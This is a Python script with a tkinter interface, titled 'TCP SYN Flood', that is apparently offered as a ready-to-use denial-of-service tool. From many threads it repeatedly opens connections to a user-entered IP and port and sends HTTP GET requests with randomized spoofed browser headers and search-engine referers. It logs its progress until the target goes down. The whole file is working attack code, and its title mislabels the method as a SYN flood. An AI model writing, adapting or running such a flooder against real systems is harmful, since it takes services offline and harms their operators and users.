import socket, requests
import random
import threading
import time

from tkinter import *

useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
              "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
              "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
              "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
              "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
              "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
              "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
              "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
              "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
              "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
              "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
              "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
              "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
              "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
              "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
              "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref = ['http://www.bing.com/search?q=',
       'https://www.yandex.com/yandsearch?text=',
       'https://duckduckgo.com/?q=']
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept-Language: en-US,en;q=0.5\r\n"]


# Function to begin attack (boolean condition indicating when to stop and stores threads to list)
def attack_click():
    thread = int(thread_entry.get())
    for i in range(thread):
        thread = threading.Thread(target=start)
        thread.stop = False
        threads.append(thread)
        thread.start()


# Function to clear entry fields and textbox
def clear_click():
    IP_entry.delete(0, END)
    port_entry.delete(0, END)
    packet_entry.delete(0, END)
    thread_entry.delete(0, END)
    textbox.delete('1.0', END)


# Function for attack procedure
def start():
    IP = IP_entry.get()
    port = int(port_entry.get())
    pack = int(packet_entry.get())
    host = random._urandom(3016)
    x = int(0)
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    accept = random.choice(acceptall)
    refer = "Referer: " + random.choice(ref) + str(IP) + "\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\n"
    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(IP), int(port))
    main_req = target_host + useragent + accept + refer + content + length + "\r\n"
    t = threading.currentThread()

    # Loops program until manually stopped (checks threads to avoid accessing textbox after stopping and outputs to textbox with continous scrolling)
    while not t.stop:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(IP), int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            x += random.randint(0, int(pack))
            if not t.stop:
                textbox.insert(END, "[+] Attacking {0}:{1} | Sent: {2}\n".format(str(IP), int(port), x))
                textbox.see(END)
        except:
            s.close()
            if not t.stop:
                textbox.insert(END, '[+] Server Down.\n')
                textbox.see(END)
            break


# Saves created threads in a list
threads = []


# Function to stop attack
def stop_click():
    for t in threads:
        t.stop = True


# Root window configuration:
root = Tk()
root.title("TCP SYN Flood")
root.configure(background="#3B5262")

# Label settings:
IP_label = Label(root, text="IP Address:", bg="#3B5262")
port_label = Label(root, text="Port Number:", bg="#3B5262")
packet_label = Label(root, text="Number of Packets:", bg="#3B5262")
thread_label = Label(root, text="Number of Threads:", bg="#3B5262")

# User entry settings:
IP_entry = Entry(root, highlightbackground="#3B5262", bg="black", fg="white")
port_entry = Entry(root, highlightbackground="#3B5262", bg="black", fg="white")
packet_entry = Entry(root, highlightbackground="#3B5262", bg="black", fg="white")
thread_entry = Entry(root, highlightbackground="#3B5262", bg="black", fg="white")

# Default entry values:
port_entry.insert(END, '80')
packet_entry.insert(END, '100')
thread_entry.insert(END, '200')

# Label mounting configurations:
IP_label.grid(row=0, sticky=E, column=0)
port_label.grid(row=1, sticky=E, column=0)
packet_label.grid(row=2, sticky=E, column=0)
thread_label.grid(row=3, sticky=E, column=0)

# Entry mounting configurations:
IP_entry.grid(row=0, sticky=W, column=1)
port_entry.grid(row=1, sticky=W, column=1)
packet_entry.grid(row=2, sticky=W, column=1)
thread_entry.grid(row=3, sticky=W, column=1)

# Attack Button settings and configurations (executes attack from user input):
attack_button = Button(root, width=13, text="Attack", highlightbackground="#3B5262", fg="green", command=attack_click)
attack_button.bind("<Button-1>")
attack_button.grid(pady=20, padx=20, sticky=W, row=4, column=1)

# Clear Button settings and configurations (clears the user input entry fields):
clear_button = Button(root, width=5, text="Clear", highlightbackground="#3B5262", fg="blue", command=clear_click)
clear_button.bind("<Button-1>")
clear_button.grid(pady=20, sticky=W, row=4, column=0)

# Stop Button settings and configurations (stops attack and exits application):
stop_button = Button(root, width=5, text="Stop", highlightbackground="#3B5262", fg="red", command=stop_click)
stop_button.grid(pady=10, sticky=E, row=4, column=1)

# Textbox window (acts as Terminal emulator window and prints attack details):
textbox = Text(root, width=45, height=25, highlightbackground="#3B5262", bg="black", fg="#00FD61")
textbox.grid(pady=10, padx=1, sticky=W, column=1)

# Quit Button settings and configurations (stops attack and exits application):
quit_button = Button(root, text="Quit", highlightbackground="#3B5262", fg="red", command=root.quit)
quit_button.grid(pady=10, sticky=E, row=6, column=1)

root.mainloop()
